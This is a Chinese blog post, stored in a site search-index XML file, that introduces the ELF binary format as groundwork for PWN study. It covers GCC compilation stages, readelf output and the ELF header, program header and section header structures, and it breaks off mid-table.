<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PWN 入门基础：ELF 文件格式</title>
    <url>/posts/90093aa8/</url>
    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
</div>

<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>ELF（Executable and Linkable Format）文件是一种常见的二进制文件格式，主要用于 UNIX 和 UNIX-like 系统（例如 Linux）上的可执行文件、目标文件、共享库和核心转储。</p>
</div>

<hr>
<h1 id="1-ELF-文件编译过程"><a href="#1-ELF-文件编译过程" class="headerlink" title="1. ELF 文件编译过程"></a>1. ELF 文件编译过程</h1><p>以打印 “Hello World” 程序为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Linux 系统下使用 GCC 编译 C 语言编写的程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -o hello hello.c</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./hello</span>   </span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>上面使用到的 GCC 编译命令执行了四个步骤</p>
<ul>
<li><p>预处理（Propressing）</p>
</li>
<li><p>编译（Compilation）</p>
</li>
<li><p>汇编（Assembly）</p>
</li>
<li><p>链接（Linking）</p>
</li>
</ul>
<h2 id="1-1-预处理"><a href="#1-1-预处理" class="headerlink" title="1.1 预处理"></a>1.1 预处理</h2><p>预编译步骤将源代码文件 hello.c​​ 以及相关头文件，如：stdio.h​​ 等预编译生成一个 .i​​ 文件。对于 C++ 程序，其源代码文件的扩展名可能是 .cpp​​ 或 .cxx​​，头文件的扩展名可能是 .hpp​​，预编译生成 .ii​​ 文件。</p>
<p>使用 -E​​ 参数让 GCC 只进行预处理阶段操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -E -o hello.i hello.c</span></span><br></pre></td></tr></table></figure>

<p>在预处理阶段主要处理以 “#” 开头的指令</p>
<ol>
<li><p>宏替换（Macro Expansion）:</p>
<ul>
<li><p>使用 <code>#define​​</code> 定义的宏会被其值所替代。例如，<code>#define PI 3.14159</code>​​ 中的 <code>PI</code>​​ 会被 <code>3.14159</code>​​ 替代。</p>
</li>
<li><p>宏可以带参数。例如：<code>#define SQUARE(x) (x * x)​​</code>。在代码中 <code>SQUARE(5)​​</code> 会被替换为 <code>(5 * 5)</code>​​。</p>
</li>
</ul>
</li>
<li><p>文件包含（File Inclusion）:</p>
<ul>
<li><code>#include​​</code> 指令用于插入指定的文件内容。例如，<code>#include &quot;myfile.h&quot;</code>​​ 或 <code>#include &lt;stdio.h&gt;</code>​​。</li>
</ul>
</li>
<li><p>条件编译（Conditional Compilation）:</p>
<ul>
<li><code>#if</code>​​, <code>#ifdef</code>​​, <code>#ifndef</code>​​, <code>#else</code>​​, <code>#elif</code>​​, 和 <code>#endif​​</code> 指令用于条件性地编译代码。</li>
</ul>
</li>
<li><p>移除注释:</p>
<ul>
<li>预处理器将移除所有的注释，将 <code>//</code>​​ 和 <code>/* ... */</code>​​ 风格的注释替换为一个空格。</li>
</ul>
</li>
<li><p>添加行号和文件名:</p>
<ul>
<li>使用 <code>#line</code>​​ 指令可以为后续的编译步骤添加行号和文件名。</li>
</ul>
</li>
</ol>
<p>预编译生成的 <code>.i</code>​​ 文件不包含任何宏定义，因为所有的宏已经被展开，并且包含的文件也已经被插入到 <code>.i</code>​​ 文件中。所以当我们无法判断宏定义是否正确或头文件包含是否正确时，可以查看预编译后的文件来确定问题。</p>
<h2 id="1-2-编译"><a href="#1-2-编译" class="headerlink" title="1.2 编译"></a>1.2 编译</h2><p>编译阶段负责将预处理后的代码（通常是 .i​​ 文件）进行一系列词法分析、语法分析、语义分析、优化后转换为汇编语言代码（通常是 .s​​ 文件）</p>
<p>使用 <code>-S</code>​​ 参数让 GCC 执行到编译阶段</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -S -o hello.s hello.c</span></span><br></pre></td></tr></table></figure>

<p>现版本的 GCC 把预处理和编译两个步骤合并成了一个步骤，使用一个叫 cc1 的程序来完成。该程序位于 <code>/usr/libexec/gcc/x86_64-linux-gnu/13/cc1​​</code>，可以直接调用 cc1 来实现预处理和编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">/usr/libexec/gcc/x86_64-linux-gnu/13/cc1 hello.c</span></span><br></pre></td></tr></table></figure>

<p>对于不同的语言，预处理与编译的程序是不同的，如下所示：</p>
<ul>
<li><p>​<code>C</code>​​：<code>cc1</code></p>
</li>
<li><p>​<code>C++​​</code>：<code>cc1plus</code></p>
</li>
<li><p>​<code>Objective-C​​</code>：<code>cc1obj</code></p>
</li>
<li><p><code>​Fortran​​</code>：<code>f951</code></p>
</li>
<li><p>​<code>Java​​</code>：<code>ecj1</code> 或<code> ​jc1</code>​ (早期的 GCC Java 编译器是 <code>jc1</code>​，但后来使用的是 Eclipse 的 Java 编译器 ​<code>ecj</code>​，而内部工具则命名为 <code>ecj1​</code>)</p>
</li>
</ul>
<p>GCC 是对这些后台程序的封装，它会根据不同的参数来调用预编译程序 <code>cc1</code>、汇编器 <code>as</code>、链接器 <code>ld</code>。</p>
<h2 id="1-3-汇编"><a href="#1-3-汇编" class="headerlink" title="1.3 汇编"></a>1.3 汇编</h2><p>汇编阶段负责将编译阶段生成的汇编语言代码转换为机器指令。每一个汇编语句几乎都对应一条机器指令。机器指令通常以目标文件（如 <code>.o</code>​​ 或 <code>.obj​​</code> 文件）的形式存在。</p>
<p>使用 <code>-c​​</code> 参数让 GCC 执行到汇编阶段</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -c -o hello.o hello.c</span></span><br></pre></td></tr></table></figure>

<p>在 GCC 的环境中，汇编阶段通常由 GNU 汇编器 as​​ 完成，这是 GNU Binutils 套件的一部分。可以直接使用 as​​ 完成汇编步骤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">as -o hello.o hello.s</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-链接"><a href="#1-4-链接" class="headerlink" title="1.4 链接"></a>1.4 链接</h2><p>链接阶段负责将一个或多个目标文件（<code>.o</code>​​ 或 <code>.obj</code>​​ 文件）以及库文件组合成一个单一的可执行文件、共享库或静态库。链接过程确保所有的函数调用都指向正确的函数地址，并且所有的全局和静态变量引用都指向正确的存储位置。</p>
<p>在 GCC 工具链中，链接过程通常由 GNU 链接器 <code>ld</code>​​ 完成。然而，当使用 gcc​​ 命令来链接程序时，gcc​​ 会负责调用 <code>ld</code>​​ 并为其提供正确的参数和库路径，从而简化了链接过程。</p>
<h1 id="2-ELF-文件格式"><a href="#2-ELF-文件格式" class="headerlink" title="2. ELF 文件格式"></a>2. ELF 文件格式</h1><p>一个 ELF 文件主要由以下三部分组成：</p>
<ul>
<li><p>ELF header（ELF 头部）：ELF 头包含了关于 ELF 文件的重要元数据如文件类型、ELF 版本、程序架构、入口地址、其他表的大小和偏移等等。</p>
</li>
<li><p>Program Header Table（程序头表）：程序头表描述了文件的段信息和如何将它们加载到内存中。</p>
</li>
<li><p>Section Header Table（节头表）： 节头表包含了文件中所有节的信息如代码、数据、符号表等。</p>
</li>
</ul>
<p>CTF Wiki 上有一个关于链接视图比较形象的展示</p>
<p><img src="/../../../image/20230925045003.png"></p>
<h2 id="2-1-ELF-header（ELF-头部）"><a href="#2-1-ELF-header（ELF-头部）" class="headerlink" title="2.1 ELF header（ELF 头部）"></a>2.1 ELF header（ELF 头部）</h2><p>在 Linux 下可以使用 readelf 工具来查看 ELF Header。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h helloworld</span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x1060</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          13984 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 30</span><br></pre></td></tr></table></figure>

<p>在 <a href="https://elixir.bootlin.com/linux/v6.5.4/source/include/uapi/linux/elf.h#L226">Linux 内核源码</a> 中找到了对于 ELF64 Header 的结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_hdr</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> e_ident[<span class="number">16</span>];	<span class="comment">/* ELF &quot;magic number&quot; */</span></span><br><span class="line">	Elf64_Half e_type;</span><br><span class="line">	Elf64_Half e_machine;</span><br><span class="line">	Elf64_Word e_version;</span><br><span class="line">	Elf64_Addr e_entry;	<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">	Elf64_Off e_phoff;	<span class="comment">/* Program header table file offset */</span></span><br><span class="line">	Elf64_Off e_shoff;	<span class="comment">/* Section header table file offset */</span></span><br><span class="line">	Elf64_Word e_flags;</span><br><span class="line">	Elf64_Half e_ehsize;</span><br><span class="line">	Elf64_Half e_phentsize;</span><br><span class="line">	Elf64_Half e_phnum;</span><br><span class="line">	Elf64_Half e_shentsize;</span><br><span class="line">	Elf64_Half e_shnum;</span><br><span class="line">	Elf64_Half e_shstrndx;</span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>

<p>这里主要看这几个带注释的</p>
<h3 id="2-1-1-e-ident"><a href="#2-1-1-e-ident" class="headerlink" title="2.1.1 e_ident"></a>2.1.1 e_ident</h3><p>e_ident 是一个包含 16 个字节的数组，用于存储与文件识别有关的信息。部分下标对应的含义如下表</p>
<table>
<thead>
<tr>
<th align="left">宏名称</th>
<th align="left">下标</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">EI_MAG0</td>
<td align="left">0</td>
<td align="left">文件标识</td>
</tr>
<tr>
<td align="left">EI_MAG1</td>
<td align="left">1</td>
<td align="left">文件标识</td>
</tr>
<tr>
<td align="left">EI_MAG2</td>
<td align="left">2</td>
<td align="left">文件标识</td>
</tr>
<tr>
<td align="left">EI_MAG3</td>
<td align="left">3</td>
<td align="left">文件标识</td>
</tr>
<tr>
<td align="left">EI_CLASS</td>
<td align="left">4</td>
<td align="left">文件类</td>
</tr>
<tr>
<td align="left">EI_DATA</td>
<td align="left">5</td>
<td align="left">数据编码</td>
</tr>
<tr>
<td align="left">EI_VERSION</td>
<td align="left">6</td>
<td align="left">文件版本</td>
</tr>
</tbody></table>
<ul>
<li><p><code>e_ident[EI_MAG0]</code> 到 <code>e_ident[EI_MAG3]</code> 通常称为 <strong>魔数</strong>，用于标识文件为 ELF 格式。从 <code>e_ident[EI_MAG0]</code> 到 <code>e_ident[EI_MAG3]</code> 对应 x7f \x45 \x4c \x46</p>
</li>
<li><p><code>e_ident[EI_CLASS]</code> 指定文件类别，\x00 -&gt; 无效，\x01 -&gt; 32 位程序，\x02 -&gt; 64 位程序</p>
</li>
<li><p><code>e_ident[EI_DATA]</code> 指定数据存储的字节序，\x00 -&gt; 无效，\x01 -&gt; 小段存储，\x02 -&gt; 大段存储</p>
</li>
<li><p><code>e_ident[EI_VERSION]</code> 指定 ELF 格式版本。</p>
</li>
</ul>
<h3 id="2-1-2-e-entry"><a href="#2-1-2-e-entry" class="headerlink" title="2.1.2 e_entry"></a>2.1.2 e_entry</h3><p>指定了程序的入口点的虚拟地址。当程序被加载到内存中执行时，执行控制将从这个地址开始。</p>
<h3 id="2-1-3-e-phoff"><a href="#2-1-3-e-phoff" class="headerlink" title="2.1.3 e_phoff"></a>2.1.3 e_phoff</h3><p>指定程序头表（Program Header Table）在 ELF 文件中的偏移量。</p>
<h3 id="2-1-4-e-shoff"><a href="#2-1-4-e-shoff" class="headerlink" title="2.1.4 e_shoff"></a>2.1.4 e_shoff</h3><p>指定节头表（Section Header Table）在 ELF 文件中的偏移量。</p>
<h2 id="2-2-Program-Header-Table（程序头表）"><a href="#2-2-Program-Header-Table（程序头表）" class="headerlink" title="2.2 Program Header Table（程序头表）"></a>2.2 Program Header Table（程序头表）</h2><p>Program Header Table （程序头表）是一个结构体数组，数组元素的大小与个数由 ELF Header 中的 <code>e_phentsize</code> 和 <code>e_phnum</code> 决定。在 64 位程序中每一个元素的类型是 <code>elf64_phdr</code>，描述了一个段或者其它系统在准备程序执行时所需要的信息。</p>
<p><code>elf64_phdr</code> 的数据结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_phdr</span> &#123;</span></span><br><span class="line">	Elf64_Word p_type;</span><br><span class="line">	Elf64_Word p_flags;</span><br><span class="line">	Elf64_Off p_offset;	<span class="comment">/* Segment file offset */</span></span><br><span class="line">	Elf64_Addr p_vaddr;	<span class="comment">/* Segment virtual address */</span></span><br><span class="line">	Elf64_Addr p_paddr;	<span class="comment">/* Segment physical address */</span></span><br><span class="line">	Elf64_Xword p_filesz;	<span class="comment">/* Segment size in file */</span></span><br><span class="line">	Elf64_Xword p_memsz;	<span class="comment">/* Segment size in memory */</span></span><br><span class="line">	Elf64_Xword p_align;	<span class="comment">/* Segment alignment, file &amp; memory */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-1-段类型"><a href="#2-2-1-段类型" class="headerlink" title="2.2.1 段类型"></a>2.2.1 段类型</h3><p>p_type 字段指定段的类型。常见的段类型如下所示：</p>
<table>
<thead>
<tr>
<th align="left">名字</th>
<th align="left">取值</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">PT_NULL</td>
<td align="left">0</td>
<td align="left">表明段未使用，其结构中其他成员都是未定义的。</td>
</tr>
<tr>
<td align="left">PT_LOAD</td>
<td align="left">1</td>
<td align="left">此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余”的字节都要被置为0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</td>
</tr>
<tr>
<td align="left">PT_DYNAMIC</td>
<td align="left">2</td>
<td align="left">此类型段给出动态链接信息。</td>
</tr>
<tr>
<td align="left">PT_INTERP</td>
<td align="left">3</td>
<td align="left">此类型段给出了一个以 NULL 结尾的字符串的位置和长度，该字符串将被当作解释器调用。这种段类型仅对可执行文件有意义（也可能出现在共享目标文件中）。此外，这种段在一个文件中最多出现一次。而且这种类型的段存在的话，它必须在所有可加载段项的前面。</td>
</tr>
<tr>
<td align="left">PT_NOTE</td>
<td align="left">4</td>
<td align="left">此类型段给出附加信息的位置和大小。</td>
</tr>
<tr>
<td align="left">PT_SHLIB</td>
<td align="left">5</td>
<td align="left">该段类型被保留，不过语义未指定。而且，包含这种类型的段的程序不符合ABI标准。</td>
</tr>
<tr>
<td align="left">PT_PHDR</td>
<td align="left">6</td>
<td align="left">该段类型的数组元素如果存在的话，则给出了程序头部表自身的大小和位置，既包括在文件中也包括在内存中的信息。此类型的段在文件中最多出现一次。<strong>此外，只有程序头部表是程序的内存映像的一部分时，它才会出现</strong>。如果此类型段存在，则必须在所有可加载段项目的前面。</td>
</tr>
<tr>
<td align="left">PT_LOPROC~PT_HIPROC</td>
<td align="left">0x70000000 ~0x7fffffff</td>
<td align="left">此范围的类型保留给处理器专用语义。</td>
</tr>
</tbody></table>
<h3 id="2-2-2-程序基地址"><a href="#2-2-2-程序基地址" class="headerlink" title="2.2.2 程序基地址"></a>2.2.2 程序基地址</h3><p>目前默认情况下编译出的可执行文件保存的地址都是相对地址，内存中任何段的虚拟地址与文件中对应的虚拟地址之间的差值对于任何一个可执行文件或共享对象来说是一个单一常量值。这个差值就是基地址，基地址的一个用途就是在动态链接期间重新定位程序。</p>
<p>可执行文件或者共享目标文件的基地址是在执行过程中由以下三个数值计算的</p>
<ul>
<li>虚拟内存加载地址</li>
<li>最大页面大小</li>
<li>程序可加载段的最低虚拟地址</li>
</ul>
<p>要计算基地址，首先要确定可加载段中 p_vaddr 最小的内存虚拟地址，之后把该内存虚拟地址缩小为与之最近的最大页面的整数倍即是基地址。根据要加载到内存中的文件的类型，内存地址可能与 p_vaddr 相同也可能不同。</p>
<h3 id="2-2-3-p-flags"><a href="#2-2-3-p-flags" class="headerlink" title="2.2.3 p_flags"></a>2.2.3 p_flags</h3><p>描述段的各种属性，如下所示</p>
<p><img src="/../../../image/20230925063238.png"></p>
<p>如果 p_flags 被设置为 0，那么该段是不可访问的</p>
<p><img src="/../../../image/20230925063523.png"></p>
<p>.text 段一般具有读和执行权限，但是不会有写权限。数据段一般具有写、读以及执行权限。</p>
<h3 id="2-2-4-段内容"><a href="#2-2-4-段内容" class="headerlink" title="2.2.4 段内容"></a>2.2.4 段内容</h3><p>一个段可能包括一到多个节区，但是这并不会影响程序的加载。尽管如此，我们也必须需要各种各样的数据来使得程序可以执行以及动态链接等等。下面会给出一般情况下的段的内容。对于不同的段来说，它的节的顺序以及所包含的节的个数有所不同。此外，与处理相关的约束可能会改变对应的段的结构。</p>
<p>如下所示，代码段只包含只读的指令以及数据。</p>
<p><img src="/../../../image/20230925065508.png"></p>
<p>数据段包含可写的数据以及以及指令</p>
<p><img src="/../../../image/20230925065515.png"></p>
<h2 id="2-3-Section-Header-Table（节头表）"><a href="#2-3-Section-Header-Table（节头表）" class="headerlink" title="2.3 Section Header Table（节头表）"></a>2.3 Section Header Table（节头表）</h2><p>使用 readelf 可以查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -S helloworld</span></span><br><span class="line">There are 31 section headers, starting at offset 0x36a0:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000000318  00000318</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338</span><br><span class="line">       0000000000000030  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.gnu.bu[...] NOTE             0000000000000368  00000368</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE             000000000000038c  0000038c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         00000000000003b0  000003b0</span><br><span class="line">       0000000000000024  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           00000000000003d8  000003d8</span><br><span class="line">       00000000000000a8  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           0000000000000480  00000480</span><br><span class="line">       000000000000008d  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           000000000000050e  0000050e</span><br><span class="line">       000000000000000e  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          0000000000000520  00000520</span><br><span class="line">       0000000000000030  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000000550  00000550</span><br><span class="line">       00000000000000c0  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .rela.plt         RELA             0000000000000610  00000610</span><br><span class="line">       0000000000000018  0000000000000018  AI       6    24     8</span><br><span class="line">  [12] .init             PROGBITS         0000000000001000  00001000</span><br><span class="line">       000000000000001b  0000000000000000  AX       0     0     4</span><br><span class="line">  [13] .plt              PROGBITS         0000000000001020  00001020</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [14] .plt.got          PROGBITS         0000000000001040  00001040</span><br><span class="line">       0000000000000010  0000000000000010  AX       0     0     16</span><br><span class="line">  [15] .plt.sec          PROGBITS         0000000000001050  00001050</span><br><span class="line">       0000000000000010  0000000000000010  AX       0     0     16</span><br><span class="line">  [16] .text             PROGBITS         0000000000001060  00001060</span><br><span class="line">       0000000000000107  0000000000000000  AX       0     0     16</span><br><span class="line">  [17] .fini             PROGBITS         0000000000001168  00001168</span><br><span class="line">       000000000000000d  0000000000000000  AX       0     0     4</span><br><span class="line">  [18] .rodata           PROGBITS         0000000000002000  00002000</span><br><span class="line">       0000000000000012  0000000000000000   A       0     0     4</span><br><span class="line">  [19] .eh_frame_hdr     PROGBITS         0000000000002014  00002014</span><br><span class="line">       0000000000000034  0000000000000000   A       0     0     4</span><br><span class="line">  [20] .eh_frame         PROGBITS         0000000000002048  00002048</span><br><span class="line">       00000000000000ac  0000000000000000   A       0     0     8</span><br><span class="line">  [21] .init_array       INIT_ARRAY       0000000000003db8  00002db8</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .fini_array       FINI_ARRAY       0000000000003dc0  00002dc0</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .dynamic          DYNAMIC          0000000000003dc8  00002dc8</span><br><span class="line">       00000000000001f0  0000000000000010  WA       7     0     8</span><br><span class="line">  [24] .got              PROGBITS         0000000000003fb8  00002fb8</span><br><span class="line">       0000000000000048  0000000000000008  WA       0     0     8</span><br><span class="line">  [25] .data             PROGBITS         0000000000004000  00003000</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [26] .bss              NOBITS           0000000000004010  00003010</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [27] .comment          PROGBITS         0000000000000000  00003010</span><br><span class="line">       000000000000002b  0000000000000001  MS       0     0     1</span><br><span class="line">  [28] .symtab           SYMTAB           0000000000000000  00003040</span><br><span class="line">       0000000000000360  0000000000000018          29    18     8</span><br><span class="line">  [29] .strtab           STRTAB           0000000000000000  000033a0</span><br><span class="line">       00000000000001e0  0000000000000000           0     0     1</span><br><span class="line">  [30] .shstrtab         STRTAB           0000000000000000  00003580</span><br><span class="line">       000000000000011a  0000000000000000           0     0     1</span><br></pre></td></tr></table></figure>

<p>Section Header Table 用于定位 ELF 文件中的每个节的具体位置。ELF Header 中 <code>e_shoff</code> 字段指定从文件开头到节头表位置的字节偏移，<code>e_shnum</code> 指定节头表包含的项数，<code>e_shentsize</code> 指定每一项的字节大小。</p>
<p>节头表也是一个数组，每个数组的元素的类型是 <code>efl64_shdr</code> 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_shdr</span> &#123;</span></span><br><span class="line">  Elf64_Word sh_name;		<span class="comment">/* Section name, index in string tbl */</span></span><br><span class="line">  Elf64_Word sh_type;		<span class="comment">/* Type of section */</span></span><br><span class="line">  Elf64_Xword sh_flags;		<span class="comment">/* Miscellaneous section attributes */</span></span><br><span class="line">  Elf64_Addr sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off sh_offset;		<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf64_Xword sh_size;		<span class="comment">/* Size of section in bytes */</span></span><br><span class="line">  Elf64_Word sh_link;		<span class="comment">/* Index of another section */</span></span><br><span class="line">  Elf64_Word sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword sh_addralign;	<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf64_Xword sh_entsize;	<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>

<p>每个字段的含义如下</p>
<table>
<thead>
<tr>
<th align="left">成员</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sh_name</td>
<td align="left">节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。</td>
</tr>
<tr>
<td align="left">sh_type</td>
<td align="left">根据节的内容和语义进行分类，具体的类型下面会介绍。</td>
</tr>
<tr>
<td align="left">sh_flags</td>
<td align="left">每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。</td>
</tr>
<tr>
<td align="left">sh_addr</td>
<td align="left">如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。</td>
</tr>
<tr>
<td align="left">sh_offset</td>
<td align="left">给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset 成员给出的是概念性的偏移。</td>
</tr>
<tr>
<td align="left">sh_size</td>
<td align="left">此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。</td>
</tr>
<tr>
<td align="left">sh_link</td>
<td align="left">此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。</td>
</tr>
<tr>
<td align="left">sh_info</td>
<td align="left">此成员给出附加信息，其解释依赖于节区类型。</td>
</tr>
<tr>
<td align="left">sh_addralign</td>
<td align="left">某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。</td>
</tr>
<tr>
<td align="left">sh_entsize</td>
<td align="left">某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。</td>
</tr>
</tbody></table>
<h3 id="2-3-1-sh-type-（节类型）"><a href="#2-3-1-sh-type-（节类型）" class="headerlink" title="2.3.1 sh_type （节类型）"></a>2.3.1 sh_type （节类型）</h3><p>节名是一个字符串，只是在链接和编译过程中有意义，但它并不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）。</p>
<p>节的类型相关常量以<code>SHT_</code>开头，上述 <code>readelf -S</code> 命令执行的结果省略了该前缀。常见的节类型如下表所示：</p>
<table>
<thead>
<tr>
<th align="left">常量</th>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SHT_NULL</td>
<td align="left">0</td>
<td align="left">无效节</td>
</tr>
<tr>
<td align="left">SHT_PROGBITS</td>
<td align="left">1</td>
<td align="left"><strong>程序节</strong>。代码节、数据节都是这种类型。</td>
</tr>
<tr>
<td align="left">SHT_SYMTAB</td>
<td align="left">2</td>
<td align="left"><strong>符号表</strong></td>
</tr>
<tr>
<td align="left">SHT_STRTAB</td>
<td align="left">3</td>
<td align="left"><strong>字符串表</strong></td>
</tr>
<tr>
<td align="left">SHT_RELA</td>
<td align="left">4</td>
<td align="left"><strong>重定位表</strong>。该节包含了重定位信息。</td>
</tr>
<tr>
<td align="left">SHT_HASH</td>
<td align="left">5</td>
<td align="left"><strong>符号表的哈希表</strong></td>
</tr>
<tr>
<td align="left">SHT_DYNAMIC</td>
<td align="left">6</td>
<td align="left">动态链接信息</td>
</tr>
<tr>
<td align="left">SHT_NOTE</td>
<td align="left">7</td>
<td align="left">提示性信息</td>
</tr>
<tr>
<td align="left">SHT_NOBITS</td>
<td align="left">8</td>
<td align="left">表示该节在文件中没有内容。如<code>.bss</code>节</td>
</tr>
<tr>
<td align="left">SHT_REL</td>
<td align="left">9</td>
<td align="left">该节包含了重定位信息</td>
</tr>
<tr>
<td align="left">SHT_SHLIB</td>
<td align="left">10</td>
<td align="left">保留</td>
</tr>
<tr>
<td align="left">SHT_DNYSYM</td>
<td align="left">11</td>
<td align="left"><strong>动态链接的符号表</strong></td>
</tr>
</tbody></table>
<h3 id="2-3-2-sh-flag（节标志位）"><a href="#2-3-2-sh-flag（节标志位）" class="headerlink" title="2.3.2 sh_flag（节标志位）"></a>2.3.2 sh_flag（节标志位）</h3><p>节标志位表示该节在进程虚拟地址空间中的属性。如是否可写、是否可执行等。相关常量以<code>SHF_</code>开头。常见的节标志位如下表所示：</p>
<table>
<thead>
<tr>
<th align="left">常量</th>
<th align="left">值</th>
